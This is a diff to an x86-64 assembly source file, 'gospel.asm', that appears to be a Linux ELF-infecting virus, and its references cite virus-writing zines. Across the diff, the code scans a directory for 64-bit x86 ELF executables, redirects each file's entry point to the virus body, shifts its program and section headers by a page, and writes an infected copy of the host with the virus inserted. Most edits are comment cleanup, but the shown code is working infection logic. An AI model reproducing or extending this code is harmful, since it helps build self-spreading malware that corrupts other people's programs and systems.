@@ -65,7 +65,6 @@ BITS 64
 ; nasm -f elf64 gospel.asm -o gospel.o && x86_64-linux-gnu-ld gospel.o -o gospel
 ;
 ;
-;
 ; ************************
 ; greetz <3
 ; ************************
@@ -132,7 +131,6 @@ BITS 64
 ; 
 ; [13] “Skeksi virus,” elfmaster
 ; https://github.com/elfmaster/skeksi_virus 
-; 
 ; 
 ; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
 ; https://tmpout.sh/1/Linux.Nasty.asm
@@ -469,10 +467,10 @@ PROT_WRITE		equ 0x2
 MAP_PRIVATE		equ 0x2
 
 ;ELF header vals
-ELFCLASS64 		equ 0x2
+;ELFCLASS64 	equ 0x2
 ;ETYPE_DYN		equ 0x3
-ETYPE_EXEC		equ 0x2
-ELFX8664		equ 0x3e
+;ETYPE_EXEC		equ 0x2
+;ELFX8664		equ 0x3e
 
 ;D_TYPE values
 ;DT_REG 			equ 0x8
@@ -538,14 +536,13 @@ process_dirents:
 	mov rax, SYS_GETDENTS64
 	syscall
 
-
 	mov r8, rax						;save # of dirent entries in r8
 	mov qword [r14 + 500], rax		;also save # of dir entries to local var on stack
 ;****************************************************************************************
 ; close - syscall 0x3
-;;close(fd);
-;;rdi == fd (file descriptor)
-;; returns: 0 on success (-1 on error)
+;;	close(fd);
+;;	rdi == fd (file descriptor)
+;; 	returns: 0 on success (-1 on error)
 ;****************************************************************************************
 	mov rdi, r9
 	mov rax, SYS_CLOSE
@@ -553,16 +550,14 @@ process_dirents:
 	
 	xor rcx, rcx	
 	jmp check_file
-	
 ;****************************************************************************************
 ; write - syscall 0x1
-;;rdi == fd (file descriptor)
-;;rsi == const char* buf
-;rdx == count (# of bytes to write)
-;; returns: 0 on success (-1 on error)
+;;	rdi == fd (file descriptor)
+;;	rsi == const char* buf
+;;	rdx == count (# of bytes to write)
+;; 	returns: 0 on success (-1 on error)
 ;
 ;	these routines are used for the bulk of the debug string printing
-;
 ;****************************************************************************************
 ;	lea rsi,  [r14 + 600 + linuxdirent.d_nameq]
 ;	lea rdi, [r14 + 200] 
@@ -589,7 +584,6 @@ _write:
 ;		mov rax, SYS_WRITE
 ;		syscall
 ;		jmp _restore		
-
 ;****************************************************************************************
 ;check_file:
 ;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
@@ -603,12 +597,14 @@ _write:
 ;	*If all of the following above conditions hold, then call the infection routine
 ;	Otherwise, continue looping through the remaining files in the directory
 ;
+; a comparison using the dirent d_type is not reliable since d_type is an optional field
+; since d_type field in the dirent struct might not be available, 
+; use the macros for fstat instead for checking the validity of a candidate file 
+; associated with each dirent entry
 ;****************************************************************************************
 check_file:
 	push rcx
-	;nvm d_type might not be available; use the macros for fstat instead
 	check_elf:
-
 		lea r12, [rcx + r14 + 618]
 		mov [r14 + 160], r12
 		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
@@ -696,6 +692,12 @@ check_file:
 		pop rax
 		test rax, rax
 		js checknext
+
+;****************************************************************************************
+;ELF header vals
+;ETYPE_DYN			equ 0x3
+;ETYPE_EXEC			equ 0x2
+;****************************************************************************************
 	check_elf_header_etype:
 		cmp word [rax + 16], 0x0002		;elf_ehdr.e_type
 		je check_elf_header_magic_bytes
@@ -707,10 +709,19 @@ check_file:
 		cmp dword [rax], 0x464c457f			;elf_ehdr.e_ident
 		jnz checknext
 		
+;****************************************************************************************
+;ELF header vals
+;ELFCLASS64 		equ 0x2
+;****************************************************************************************
 	check_elf_header_64bit:
-		cmp byte [rax + 4], ELFCLASS64
+		;cmp byte [rax + 4], ELFCLASS64
+		cmp byte [rax + 4], 0x2
 		jne checknext
-		
+
+;****************************************************************************************
+;ELF header vals
+;ELFX8664			equ 0x3e
+;****************************************************************************************
 	check_elf_header_arch:
 		cmp byte [rax + 18], 0x3e			;elf_ehdr.e_machine
 		jne checknext
@@ -891,29 +902,15 @@ infect:
 			cmp word [r13 + r12], PT_LOAD		;elf_phdr.p_type offset	
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				;mov rdx, checkptloadpasslen
-				;lea rsi, checkptloadpass
-				;mov rdi, STDOUT
-				;mov rax, SYS_WRITE
-				;syscall
-				
 				cmp dword [r13 + r12 + 4], PFLAGS_RX		;elf_phdr.p_flags offset
 				je .mod_phdr_text_segment			
 				cmp dword [r13 + r12 + 4], PFLAGS_RW		;elf_phdr.p_flags offset
 				je .mod_phdr_data_segment			
-				;jne .mod_subsequent_phdr
 				jne .mod_other_ptload_phdr
 				.mod_phdr_text_segment:			
-					;mov rdx, checkphdrRXpasslen
-					;lea rsi, checkphdrRXpass
-					;mov rdi, STDOUT
-					;mov rax, SYS_WRITE
-					;syscall
-				
 					mov r10, [r13 + r12 + 16] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
 					mov qword [evaddr], r10				;save evaddr
-					
 														;new entry point of infected file = evaddr + ventry
 					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
@@ -924,29 +921,14 @@ infect:
 					add qword [r13 + r12 + 40], vlen	;elf_phdr.p_memsz offset
 					jmp .next_phdr						;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
-					;mov rdx, checkphdrRWpasslen
-					;lea rsi, checkphdrRWpass
-					;mov rdi, STDOUT
-					;mov rax, SYS_WRITE
-					;syscall
-					
-					;mov r11, [r13 + r12 + elf_phdr.p_offset]
 					mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					mov dword [data_offset_og],  r11d
-					mov qword [data_offset_original],  r11
+					mov qword [data_offset_original], r11
 					add dword r11d, [PAGESIZE]
-					;mov dword [r13 + r12 + elf_phdr.p_offset], r11d
-					mov dword [r13 + r12 + 8], r11d				;elf_phdr.p_offset
+					mov dword [r13 + r12 + 8], r11d		;elf_phdr.p_offset
 					mov dword [data_offset_new_padding],  r11d
-					;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					;add dword r10d, [PAGESIZE]
-					;mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
-					;mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					;add dword r10d, [PAGESIZE]
-					;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing
 				.mod_other_ptload_phdr:
-					;mov r11, [r13 + r12 + elf_phdr.p_offset]
 					mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					cmp r11d, [vxoffset]
 					jl .next_phdr
@@ -960,24 +942,14 @@ infect:
 				mov r11d, [vxoffset]
 				cmp r11d, 0
 				je .next_phdr
-				;mov r11, [r13 + r12 + elf_phdr.p_offset]
 				mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
 				cmp r11d, [vxoffset]
 				jl .next_phdr
 				add dword r11d, [PAGESIZE]
-				;mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 				mov dword [r13 + r12 + 8], r11d				;elf_phdr.p_offset
-				
-				;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-				;add dword r10d, [PAGESIZE]
-				;mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
-				;mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-				;add dword r10d, [PAGESIZE]
-				;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 		.next_phdr:
 			pop rcx
 			dec cx 
-			;add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
 			add r12w, word [r13 + 54] 					 ;add elf_ehdr.e_phentsize to phdr offset in r12 
 			cmp cx, 0
 			jg .phdr_loop
@@ -1004,66 +976,35 @@ infect:
 	xor r10, r10
 	xor r11, r11
 	xor rcx, rcx
-	;mov word cx, [r13 + elf_ehdr.e_shnum]
 	mov word cx, [r13 + 60]											; elf_ehdr.e_shnum
 
 	check_shdrs:
-		;mov rdx, checkshdrstartlen
-		;lea rsi, checkshdrstart
-		;mov rdi, STDOUT
-		;mov rax, SYS_WRITE
-		;syscall
 		.shdr_loop:
 			push rcx
-			;mov r11, [r13 + r15 + elf_shdr.sh_offset]
 			mov r11, [r13 + r15 + 24]							;elf_shdr.sh_offset
-			;cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			cmp dword r11d, [vxoffset]
 			jge .mod_subsequent_shdr
-			;jl .next_shdr
 			jl .check_for_last_text_shdr
 			.check_for_last_text_shdr:
-				;mov rdx, modvxshdrpass0len
-				;lea rsi, modvxshdrpass0
-				;mov rdi, STDOUT
-				;mov rax, SYS_WRITE
-				;syscall
-				
-				;mov r11, [r13 + r15 + elf_shdr.sh_addr]
 				mov r11, [r13 + r15 + 16]						;elf_shdr.sh_addr
-				;add dword r11d, [r13 + r15 + elf_shdr.sh_size]
-				;add r11, qword [r13 + r15 + elf_shdr.sh_size]
 				add r11, qword [r13 + r15 + 32]					;elf_shdr.sh_size
-				;cmp dword r11d, [vxoffset]
 				cmp r11, [evaddr]
 				jne .next_shdr
-				;jne .mod_subsequent_shdr
 			.mod_last_text_section_shdr:
-				;mov r10, [r13 + r15 + elf_shdr.sh_size]
 				mov r10, [r13 + r15 + 32]						;elf_shdr.sh_size
 				add dword r10d, vlen
-				;mov [r13 + r15 + elf_shdr.sh_size], r10
 				mov [r13 + r15 + 32], r10						;elf_shdr.sh_size
 				jmp .next_shdr
 			.mod_subsequent_shdr:
-				;mov rdx, modsubsequentshdrlen
-				;lea rsi, modsubsequentshdr
-				;mov rdi, STDOUT
-				;mov rax, SYS_WRITE
-				;syscall
-				;mov r11, [r13 + r15 + elf_shdr.sh_offset]
 				mov r11, [r13 + r15 + 24]							;elf_shdr.sh_offset
 				add dword r11d, [PAGESIZE]
-				;mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
 				mov dword [r13 + r15 + 24], r11d					;elf_shdr.sh_offset
 		.next_shdr:
 			pop rcx
 			dec cx 
-			;add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_shentsize to shdr offset in r15 
 			add r15w, word [r13 + 58] 				; add elf_ehdr.e_shentsize to shdr offset in r15 
 			cmp cx, 0
 			jg .shdr_loop
-	;mov r11, [r13 + elf_ehdr.e_shoff]
 	mov r11, [r13 + 40] 					;elf_ehdr.e_shoff
 	mov qword [oshoff], r11
 	cmp dword r11d, [vxoffset]
@@ -1121,13 +1062,11 @@ frankenstein_elf:
 	mov [r14 + 0x800], rax
 	lea rdi, [r14 + 0x800]			;name of file in rdi
 	mov rsi, 0755o					;mode - 755 (file perms for new file)
-									;(O_CREAT | O_TRUNC | O_WRONLY)
-	mov rax, SYS_CREAT
+	mov rax, SYS_CREAT				;(O_CREAT | O_TRUNC | O_WRONLY)
 	syscall
 	
 	mov r9, rax
 	mov rdi, rax
-
 	xor rdx, rdx
 	
 	;write ELF header to temp file
@@ -1142,11 +1081,9 @@ frankenstein_elf:
 		mov rdx, [PAGESIZE]
 	.write_host_ehdr_phdrs_textsegment:	
 		mov rdi, r9
-		;lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		lea rsi, [r13]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
-
 
 	.write_virus_totemp:
 		call .delta
@@ -1177,7 +1114,6 @@ frankenstein_elf:
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
 	;before we write the original host data segment to the temp file
 	.write_padding_after_vx:
-		;xor rsi, rsi
 		xor r10, r10
 		xor r11, r11
 		mov r10d, dword [vxoffset]
@@ -1192,34 +1128,21 @@ frankenstein_elf:
 		add eax, dword [PAGESIZE]
 		mov dword [vx_padding_size], eax
 		mov esi, eax
-		;mov rsi, qword [data_offset_new_padding]
 		mov rax, SYS_FTRUNCATE
 		syscall
-;		jmp .close_temp
 
 	.write_datasegment_totemp:
 		xor r10, r10
 		mov rdx, qword [oshoff]
-		;mov rdx, qword [r14 + 48] 	;filestat.st_size
-		;sub edx, dword [vxoffset]
-		;sub edx, dword [data_offset_og]
-		;sub edx, dword [evaddr]
 		sub edx, dword [intermediary_ptload_segment_offset]
-		;sub edx, dword [data_offset_original]
-		;lea rsi, [r13 + elf_ehdr]				;r13 contains pointer to mmap'd file
-		lea rsi, [r13]							;r13 contains pointer to mmap'd file
-		;add rsi, qword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
-		;add rsi, qword [evaddr]					;adjust rsi address to point to original data segment offset of mmap'd file
-		add rsi, qword [intermediary_ptload_segment_offset]
-		;mov r10d, dword [data_offset_new_padding]
+		lea rsi, [r13]										;r13 contains pointer to mmap'd file
+		add rsi, qword [intermediary_ptload_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
+															;following .text segment in mmap'd original host file
 		mov r10d, dword [vx_padding_size]
-		;mov r10d, dword [vxdatasegment]
 		mov rax, SYS_PWRITE64
 		syscall
-;		jmp .close_temp
 
 	.write_patched_shdrs_totemp:
-;		mov rdx, qword [oshoff]
 		mov rdx, [r14 + 48] 	;filestat.st_size
 		sub rdx, qword [oshoff]
 		lea rsi, [r13]
@@ -1250,7 +1173,6 @@ _restore:
 	mov rsp, rbp
 	pop rbp
 	
-;exit
 vlen equ $-_start
 _end:
 	xor rdi, rdi
